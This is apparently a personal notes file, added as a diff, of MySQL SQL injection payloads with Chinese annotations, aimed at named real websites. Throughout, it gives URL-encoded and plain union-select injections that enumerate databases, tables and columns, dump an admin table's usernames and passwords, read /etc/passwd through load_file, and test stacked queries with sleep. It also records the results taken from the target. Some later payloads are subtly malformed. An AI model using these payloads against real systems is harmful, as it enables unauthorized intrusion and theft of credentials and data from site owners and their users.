@@ -1,0 +1,410 @@
+http://www.ac-psych.org/index.php?id=1*/* 相当于单引号
+
+/index.php?id=1%20/*!39999%20and%201=2*/--  and 1=2
+
+ /index.php?id=1%20and%201=2%20union%20select%200x5e5e5e6161615e5e5e/*%20and%201=1
+相当于union select 1,2,3,4,5....  同样递增数量0x5e5e5e6161615e5e5e （就是^^^aaa^^^的16进制）
+ 这个只有一个字段 
+-----------------------------------------------------------------------------------------------------------------------------
+%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),system_user(),char(94),char(94),char(94)),0,0%20/*%20and%201=1 
+盲注用：concat(user()) concat((user)),0  查看原文件，找xxx@xxx
+
+%20%20and%20char(0x49)=unhex(hex(char(0x49)))%20and%201%3C2
+---------------------------------------------------------------------------------------------------------
+/index.php?id=1%20and%201=2%20union%20select%20char(97,98,97,98,97,97,97,98,98,98,97,99,97)/*%20and%201=1
+尝试显示'ababaaabbbaca'
+
+/index.php?id=1%20and%201=2%20union%20select%20'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'/*%20and%201=1
+/index.php?id=1%20and%201=2%20union%20select%20'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',1,1,1,1/*%20and%201=1
+来爆字段位置
+
+/index.php?id=1%20/*!49999%20and%201=2*/-- 
+
+*********************************本例彩用0 0盲注法+跨库查询  *************************************************
+/*判断有几个数据库：
+/*                 %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),count(*),char(94),char(94),char(94)),0,0%20from%20(select%20*%20from%20information_schema.tables%20group%20by%20table_schema%20order%20by%20table_schema)t%20limit%201/*%20and%201=1 
+/*
+/*  逐个爆个：
+/*                 %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),table_schema,char(94),char(94),char(94)),0,0%20from%20(select%20*%20from%20(select%20*%20from%20information_schema.tables%20group%20by%20table_schema%20order%20by%20table_schema%20limit%200,1)%20t%20order%20by%20table_schema%20desc)t%20limit%201/*%20and%201=1
+/*判断某库有几个表：
+/*                 %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),cast(count(*)%20as%20char),char(94),char(94),char(94)),0,0%20from%20information_schema.tables%20where%20table_schema=0x6d793134375f6e657773%20limit%201/*%20and%201=1
+/* information_schema有几个表：
+/*   %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),cast(count(*)%20as%20char),char(94),char(94),char(94)),0,0%20from%20information_schema.tables%20where%20table_schema=0x696e666f726d6174696f6e5f736368656d61%20limit%201/*%20and%201=1 
+/*逐个爆表
+/*                %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),table_name,char(94),char(94),char(94)),0,0%20from%20(select%20*%20from%20(select%20*%20from%20information_schema.tables%20where%20table_schema=0x6d793134375f6e657773%20order%20by%20table_schema%20limit%206,1)%20t%20order%20by%20table_schema%20desc)t%20limit%201/*%20and%201=1
+/*爆information_schema中的逐个表：  ****有两个表放着所有库的表名和字段名(tables,columns)
+/*                %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),table_name,char(94),char(94),char(94)),0,0%20from%20(select%20*%20from%20(select%20*%20from%20information_schema.tables%20where%20table_schema=0x696e666f726d6174696f6e5f736368656d61%20order%20by%20table_schema%20limit%200,1)%20t%20order%20by%20table_schema%20desc)t%20limit%201/*%20and%201=1 
+/*跨库查询：当前库是my147_news, 查询my147_admin库有多少个表
+/*                %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),cast(count(*)%20as%20char),char(94),char(94),char(94)),0,0%20from%20information_schema.tables%20where%20table_schema=0x6d793134375f61646d696e%20limit%201/*%20and%201=1 
+/*http://www.my147.com/player/web/normal/news.php?id=47
+/* 逐个爆表:                                                                                                                                                                                                                                                                               逐个爆                 
+/*          %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),table_name,char(94),char(94),char(94)),0,0%20from%20(select%20*%20from%20(select%20*%20from%20information_schema.tables%20where%20table_schema=0x6d793134375f61646d696e%20order%20by%20table_schema%20limit%20,1)%20t%20order%20by%20table_schema%20desc)t%20limit%201/*%20and%201=1  
+/*判断有几个字段：
+/*              %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),cast(count(*)%20as%20char),char(94),char(94),char(94)),0,0%20from%20information_schema.columns%20%20where%20table_name=0x6d61646d696e%20and%20table_schema=0x6d793134375f61646d696e%20limit%201/*%20and%201=1
+/*columns表中有几个字段：
+/*                     %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),cast(count(*)%20as%20char),char(94),char(94),char(94)),0,0%20from%20information_schema.columns%20%20where%20table_name=0x434f4c554d4e53%20and%20table_schema=0x696e666f726d6174696f6e5f736368656d61%20limit%201/*%20and%201=1
+/*
+/* 逐个爆字段名:                                                                                                                                                                                                                  表名:madmin                                   库名   :my147_admin                       
+/*              %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),column_name,char(94),char(94),char(94)),0,0%20from%20(select%20*%20from%20(select%20*%20from%20information_schema.columns%20where%20table_name=0x6d61646d696e%20and%20table_schema=0x6d793134375f61646d696e%20order%20by%201%20limit%201,1)%20t%20order%20by%201%20desc)t%20limit%201/*%20and%201=1 
+/*
+/*判断记录数：
+/*          %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),cast(count(*)%20as%20char),char(94),char(94),char(94)),0,0%20from%20my147_admin.madmin%20where%201=1%20limit%201/*%20and%201=1
+/*第一条记录的用户名:                                                         用户                                                                                     数据库.表名                                                  逐个爆出来  
+/*          %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),aname,char(94),char(94),char(94)),0,0%20from%20(select%20*%20from%20(select%20*%20from%20my147_admin.madmin%20where%201=1%20order%20by%201%20limit%200,1)%20t%20order%20by%201%20desc)t%20limit%201/*%20and%201=1
+/*
+/*
+/*当然这样也是可以的：爆用户和密码：
+/*    %20and%201=2%20union%20select%20concat(char(94),char(94),char(94),apass,char(94),char(94),char(94),aname),0,0%20from%20(select%20*%20from%20(select%20*%20from%20my147_admin.madmin%20where%201=1%20order%20by%201%20limit%207,1)%20t%20order%20by%201%20desc)t%20limit%201/*%20and%201=1 
+/*
+/* 
+/*
+/*
+
+
+
+
+爆数据裤名:                                                                                                                                        
+/index.php?id=1%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),database(),char(94),char(94),char(94))%20/*%20and%201=1
+
+char(94)=^  所以会显示出:^^^acpsych_ac-psych^^^ 
+
+ 判断系统版本：/index.php?id=1%20and%20(select%20ascii(substr(@@datadir,%201,%201)))=47%20and%201=1 显示正常是linux否则是windows
+DATA地址：/index.php?id=1%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),@@datadir,char(94),char(94),char(94))%20/*%20and%201=1   ^^^/var/db/mysql/^^^ 
+
+爆数据裤地址：/index.php?id=1%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),@@basedir,char(94),char(94),char(94))%20/*%20and%201=1    ^^^/usr/local/^^^ 
+
+
+版本:/index.php?id=1%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),version(),char(94),char(94),char(94))%20/*%20and%201=1     ^^^5.0.33-log^^^ 
+
+用户：/index.php?id=1%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),user(),char(94),char(94),char(94))%20/*%20and%201=1
+
+系统用户：/index.php?id=1%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),system_user(),char(94),char(94),char(94))%20/*%20and%201=1
+
+当前用户：/index.php?id=1%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),session_user(),char(94),char(94),char(94))%20/*%20and%201=1
+
+连接用户：/index.php?id=1%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),current_user(),char(94),char(94),char(94))%20/*%20and%201=1
+
+TEMP地址：/index.php?id=1%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),@@tmpdir,char(94),char(94),char(94))%20/*%20and%201=1  ^^^/var/tmp/^^^ 
+
+爆所有数据裤：/index.php?id=1%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),count(*),char(94),char(94),char(94))%20from%20mysql.user%20/*%20and%201=1
+
+判断有几个裤：
+/index.php?id=1%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),count(*),char(94),char(94),char(94))%20from%20(select%20*%20from%20information_schema.tables%20group%20by%20table_schema%20order%20by%20table_schema)t%20limit%201/*%20and%201=1  5.0版
+%20and%201=2%20union%20select%200,0,concat(char(94),char(94),char(94),count(*),char(94),char(94),char(94)),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20mysql.user%20--   4.0版
+爆裤名：
+/index.php?id=1%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),table_schema,char(94),char(94),char(94))%20from%20(select%20*%20from%20(select%20*%20from%20information_schema.tables%20group%20by%20table_schema%20order%20by%20table_schema%20limit%200,1)%20t%20order%20by%20table_schema%20desc)t%20limit%201/*%20and%201=1
+%20and%201=2%20union%20select%200,0,concat(char(94),char(94),char(94),user,char(94),char(94),char(94)),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20(select%20*%20from%20(select%20*%20from%20mysql.user%20order%20by%20user%20limit%200,1)%20t%20order%20by%20user%20desc)t%20limit%201--   4.0版，要知道一个表名，如user
+
+Stacked	No:
+http://www.ac-psych.org/index.php?id=1%20;sleep(5);--
+
+判断表数量：
+
+%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),cast(count(*)%20as%20char),char(94),char(94),char(94))%20from%20information_schema.tables%20where%20table_schema=0x616370737963685f61632d7073796368%20limit%201/*%20and%201=1
+
+爆表名：
+%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),table_name,char(94),char(94),char(94))%20from%20(select%20*%20from%20(select%20*%20from%20information_schema.tables%20where%20table_schema=0x616370737963685f61632d7073796368%20order%20by%20table_schema%20limit%200,1)%20t%20order%20by%20table_schema%20desc)t%20limit%201/*%20and%201=1
+
+判断列的数量：如:表是menu=0x6D656E75
+%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),cast(count(*)%20as%20char),char(94),char(94),char(94))%20from%20information_schema.columns%20%20where%20table_name=0x6d656e75%20and%20table_schema=0x616370737963685f61632d7073796368%20limit%201/*%20and%201=1
+
+爆列名：
+%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),column_name,char(94),char(94),char(94))%20from%20(select%20*%20from%20(select%20*%20from%20information_schema.columns%20where%20table_name=0x6d656e75%20and%20table_schema=0x616370737963685f61632d7073796368%20order%20by%201%20limit%200,1)%20t%20order%20by%201%20desc)t%20limit%201/*%20and%201=1
+
+判断记录数：如:id=
+%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),cast(count(*)%20as%20char),char(94),char(94),char(94))%20from%20menu%20where%201=1%20limit%201/*%20and%201=1
+
+爆记录内容：
+
+%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),id,char(94),char(94),char(94))%20from%20(select%20*%20from%20(select%20*%20from%20menu%20where%201=1%20order%20by%201%20limit%200,1)%20t%20order%20by%201%20desc)t%20limit%201/*%20and%201=1
+
+读文件：
+%20and%201=2%20union%20select%20concat(char(94),char(94),char(94),load_file(0x2f6574632f706173737764),char(94),char(94),char(94))%20/*%20and%201=1 
+
+
+
+
+
+
+=======================================================================================================================================================================================================================================================================================================================
+
+http://www.ac-psych.org/index.php?id=1*/* 相当于单引号
+
+/index.php?id=1 /*!39999 and 1=2*/--  and 1=2
+
+ /index.php?id=1 and 1=2 union select 0x5e5e5e6161615e5e5e/* and 1=1
+相当于union select 1,2,3,4,5....  同样递增数量0x5e5e5e6161615e5e5e （就是^^^aaa^^^的16进制）
+ 这个只有一个字段  
+
+/index.php?id=1 and 1=2 union select char(97,98,97,98,97,97,97,98,98,98,97,99,97)/* and 1=1
+尝试显示'ababaaabbbaca'
+
+/index.php?id=1 and 1=2 union select 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'/* and 1=1
+/index.php?id=1 and 1=2 union select 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',1,1,1,1/* and 1=1
+来爆字段位置
+
+/index.php?id=1 /*!49999 and 1=2*/-- 
+
+爆数据裤名:
+/index.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),database(),char(94),char(94),char(94)) /* and 1=1
+
+char(94)=^  所以会显示出:^^^acpsych_ac-psych^^^ 
+
+ 判断系统版本：/index.php?id=1 and (select ascii(substr(@@datadir, 1, 1)))=47 and 1=1 显示正常是linux否则是windows
+DATA地址：/index.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),@@datadir,char(94),char(94),char(94)) /* and 1=1   ^^^/var/db/mysql/^^^ 
+
+爆数据裤地址：/index.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),@@basedir,char(94),char(94),char(94)) /* and 1=1    ^^^/usr/local/^^^ 
+
+
+版本:/index.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),version(),char(94),char(94),char(94)) /* and 1=1     ^^^5.0.33-log^^^ 
+
+用户：/index.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),user(),char(94),char(94),char(94)) /* and 1=1
+
+系统用户：/index.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),system_user(),char(94),char(94),char(94)) /* and 1=1
+
+当前用户：/index.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),session_user(),char(94),char(94),char(94)) /* and 1=1
+
+连接用户：/index.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),current_user(),char(94),char(94),char(94)) /* and 1=1
+
+TEMP地址：/index.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),@@tmpdir,char(94),char(94),char(94)) /* and 1=1  ^^^/var/tmp/^^^ 
+
+爆所有数据裤：/index.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),count(*),char(94),char(94),char(94)) from mysql.user /* and 1=1
+
+判断有几个裤：
+/index.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),count(*),char(94),char(94),char(94)) from (select * from information_schema.tables group by table_schema order by table_schema)t limit 1/* and 1=1
+
+爆裤名：
+/index.php?id=1 and 1=2 union select concat(char(94),char(94),char(94),table_schema,char(94),char(94),char(94)) from (select * from (select * from information_schema.tables group by table_schema order by table_schema limit 0,1) t order by table_schema desc)t limit 1/* and 1=1
+
+Stacked	No:
+http://www.ac-psych.org/index.php?id=1 ;sleep(5);--
+
+判断表数量：
+
+ and 1=2 union select concat(char(94),char(94),char(94),cast(count(*) as char),char(94),char(94),char(94)) from information_schema.tables where table_schema=0x616370737963685f61632d7073796368 limit 1/* and 1=1
+
+爆表名：
+ and 1=2 union select concat(char(94),char(94),char(94),table_name,char(94),char(94),char(94)) from (select * from (select * from information_schema.tables where table_schema=0x616370737963685f61632d7073796368 order by table_schema limit 0,1) t order by table_schema desc)t limit 1/* and 1=1
+
+判断列的数量：如:表是menu=0x6D656E75
+ and 1=2 union select concat(char(94),char(94),char(94),cast(count(*) as char),char(94),char(94),char(94)) from information_schema.columns  where table_name=0x6d656e75 and table_schema=0x616370737963685f61632d7073796368 limit 1/* and 1=1
+
+爆列名：
+ and 1=2 union select concat(char(94),char(94),char(94),column_name,char(94),char(94),char(94)) from (select * from (select * from information_schema.columns where table_name=0x6d656e75 and table_schema=0x616370737963685f61632d7073796368 order by 1 limit 0,1) t order by 1 desc)t limit 1/* and 1=1
+
+判断记录数：如:id=
+ and 1=2 union select concat(char(94),char(94),char(94),cast(count(*) as char),char(94),char(94),char(94)) from menu where 1=1 limit 1/* and 1=1
+
+爆记录内容：
+
+ and 1=2 union select concat(char(94),char(94),char(94),id,char(94),char(94),char(94)) from (select * from (select * from menu where 1=1 order by 1 limit 0,1) t order by 1 desc)t limit 1/* and 1=1
+
+读文件：
+ and 1=2 union select concat(char(94),char(94),char(94),load_file(0x2f6574632f706173737764),char(94),char(94),char(94)) /* and 1=1 
+
+
+
+
+
+
+
+
+爆 表名：
+php?id=11 and 1=2 union select concat(table_name),0,0 from information_schema.columns where table_name=0x64644646--
+转义字符容错爆 表名：：
+and 1=2 union select concat(char(94),char(94),table_name,char(94),char(94)),0,0 from informtion_schema.columns where table_name=0x64646664
+cast转换配合limit爆 表名：：
+ and 1=2 union select concat(char(94),char(94),cast(count(*) as char)char(94),char(94)),0,0 from information_schema.table where table_schema=0x02556655665 limit 1--
+
+0x+数据  是库名
+爆第一个库名：
+desc对order by 排序 逐个猜limit
+and 1=2 union select concat(table_name),0,0 from (select * from (select * from information_schema.table where table_schema=0x654566546 order by table_schema limit 1,1) t order by table_schema desc)t limit 1--
+                                                                                                                                                                    2,1  3,1.....
+爆列名：
+and 1=2 union select concat(column_name),0,0 from (select * (select * from information_schema.columns where table_name=0x66556565 and table_schema=0x6599库名 order by 1 limit 0,1) t order by 1 desc)t limit 1--
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
